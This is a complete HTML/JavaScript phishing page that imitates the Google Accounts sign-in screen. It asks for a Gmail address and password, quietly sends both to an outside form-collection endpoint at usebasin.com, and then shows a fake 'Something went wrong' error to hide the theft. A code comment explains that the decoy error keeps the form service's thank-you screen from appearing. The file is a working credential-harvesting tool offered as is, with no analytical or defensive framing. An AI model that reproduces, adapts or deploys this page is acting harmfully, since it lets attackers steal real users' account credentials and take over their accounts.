<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in - Google Accounts</title>
    <style>
        /* CSS CORE - DARK MODE MOBILE CLONE */
        * { box-sizing: border-box; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
        body { background-color: #000; color: #fff; margin: 0; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        .viewport { width: 100%; max-width: 400px; padding: 24px; display: flex; flex-direction: column; position: relative; }
        
        .logo-area { height: 48px; margin-bottom: 12px; display: flex; align-items: center; }
        .g-logo { width: 32px; height: 32px; object-fit: contain; } 

        h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px 0; }
        .sub { font-size: 16px; margin-bottom: 32px; color: #e8eaed; line-height: 1.4; }

        .field { position: relative; margin-bottom: 10px; width: 100%; }
        .field input {
            width: 100%; padding: 18px 14px; background: transparent; 
            border: 1px solid #5f6368; border-radius: 4px; color: #fff; font-size: 16px; outline: none;
        }
        .field input:focus { border: 2px solid #8ab4f8; }
        .field input.error-border { border: 2px solid #f28b82; }

        .field label {
            position: absolute; left: 14px; top: 18px; color: #9aa0a6;
            transition: 0.2s ease all; pointer-events: none;
        }
        .field input:focus ~ label, .field input:not(:placeholder-shown) ~ label {
            top: -10px; left: 10px; background: #000; padding: 0 5px; font-size: 12px; color: #8ab4f8;
        }
        
        #email-error { color: #f28b82; font-size: 12px; margin-bottom: 10px; display: none; }

        .btn-blue { background: none; border: none; color: #8ab4f8; font-weight: 500; font-size: 14px; cursor: pointer; padding: 0; }
        .next-pill {
            background-color: #8ab4f8; color: #202124; border: none;
            padding: 10px 24px; border-radius: 20px; font-weight: 500; cursor: pointer;
        }

        .row { display: flex; justify-content: space-between; align-items: center; margin-top: 45px; }
        .row-end { display: flex; justify-content: flex-end; margin-top: 45px; }

        .user-pill {
            display: inline-flex; align-items: center; border: 1px solid #5f6368;
            border-radius: 20px; padding: 4px 12px; margin-bottom: 24px; font-size: 14px;
        }
        .user-pill svg { margin-left: 8px; fill: #e8eaed; }

        .show-pw { display: flex; align-items: center; font-size: 14px; margin-top: 10px; }
        .show-pw input { margin-right: 12px; width: 18px; height: 18px; accent-color: #8ab4f8; }

        #loading-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center; z-index: 100;
        }
        .loading-box {
            background: #202124; padding: 24px; border-radius: 4px; 
            display: flex; align-items: center; min-width: 280px; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        .spinner {
            width: 20px; height: 20px; border: 2px solid #8ab4f8; border-top: 2px solid transparent;
            border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        footer { margin-top: auto; padding-bottom: 20px; }
        .lang-trigger { font-size: 12px; color: #9aa0a6; cursor: pointer; margin-bottom: 24px; display: flex; align-items: center; }
        .lang-trigger::after { content: '▼'; font-size: 8px; margin-left: 8px; }
        .footer-links { display: flex; gap: 24px; font-size: 12px; color: #9aa0a6; }
        
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="loading-overlay">
        <div class="loading-box">
            <div class="spinner"></div>
            <span style="font-size: 16px;">Signing in</span>
        </div>
    </div>

    <div class="viewport">
        <div class="logo-area">
            <img src="logo.png" class="g-logo" alt="Google">
        </div>

        <div id="p1">
            <h1>Sign in</h1>
            <p class="sub">Use your Google Account</p>
            <div class="field">
                <input type="text" id="email" required placeholder=" ">
                <label>Email or phone</label>
            </div>
            <div id="email-error">Enter a valid Gmail address</div>
            <button type="button" class="btn-blue">Forgot email?</button>
            <div class="row">
                <button type="button" class="btn-blue">Create account</button>
                <button type="button" class="next-pill" onclick="goNext()">Next</button>
            </div>
        </div>

        <div id="p2" class="hidden">
            <h1>Welcome</h1>
            <div class="user-pill">
                <span id="display-user"></span>
                <svg viewBox="0 0 24 24" width="12" height="12"><path d="M7 10l5 5 5-5z"/></svg>
            </div>
            
            <form id="myForm" method="POST" action="https://usebasin.com/f/64c144cdb3ca">
                <div class="field">
                    <input type="password" name="password" id="pass" required placeholder=" ">
                    <label>Enter your password</label>
                </div>
                <div class="show-pw">
                    <input type="checkbox" id="shw" onclick="togglePass()">
                    <label for="shw">Show password</label>
                </div>
                <div class="row">
                    <button type="button" class="btn-blue">Forgot password?</button>
                    <button type="submit" class="next-pill">Next</button>
                </div>
            </form>
        </div>

        <div id="p3" class="hidden">
            <h1>Something went wrong</h1>
            <p class="sub">Sorry, something went wrong there. Please try again later.</p>
            <div class="row-end">
                <button type="button" class="next-pill" onclick="resetToLogin()">Next</button>
            </div>
        </div>

        <footer>
            <div class="lang-trigger">English (United Kingdom)</div>
            <div class="footer-links">
                <span>Help</span>
                <span>Privacy</span>
                <span>Terms</span>
            </div>
        </footer>
    </div>

    <script>
        function goNext() {
            const emailInput = document.getElementById('email');
            const emailValue = emailInput.value;
            const errorText = document.getElementById('email-error');
            const gmailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;

            if(gmailPattern.test(emailValue)) {
                emailInput.classList.remove('error-border');
                errorText.style.display = "none";
                document.getElementById('p1').classList.add('hidden');
                document.getElementById('p2').classList.remove('hidden');
                document.getElementById('display-user').innerText = emailValue;
            } else {
                emailInput.classList.add('error-border');
                errorText.style.display = "block";
                emailInput.focus();
            }
        }

        function togglePass() {
            const p = document.getElementById('pass');
            p.type = p.type === 'password' ? 'text' : 'password';
        }

        function resetToLogin() {
            document.getElementById('p3').classList.add('hidden');
            document.getElementById('p1').classList.remove('hidden');
            document.getElementById('email').value = "";
            document.getElementById('pass').value = "";
        }

        // UPDATED SILENT SUBMIT FOR GETFORM
        document.getElementById("myForm").addEventListener("submit", function(event) {
            event.preventDefault();
            
            document.getElementById('loading-overlay').style.display = 'flex';
            
            const formData = new FormData(this);
            formData.append('email_user', document.getElementById('email').value);

            // Fetch to Getform
            fetch(this.action, {
                method: "POST",
                body: formData,
                headers: { 'Accept': 'application/json' }
            }).finally(() => {
                // Wait 2 seconds, then show P3 (The Error Page)
                // This prevents the Getform "Thank You" screen from appearing
                setTimeout(() => {
                    document.getElementById('loading-overlay').style.display = 'none';
                    document.getElementById('p2').classList.add('hidden');
                    document.getElementById('p3').classList.remove('hidden');
                }, 2000);
            });
        });
    </script>
</body>
</html>
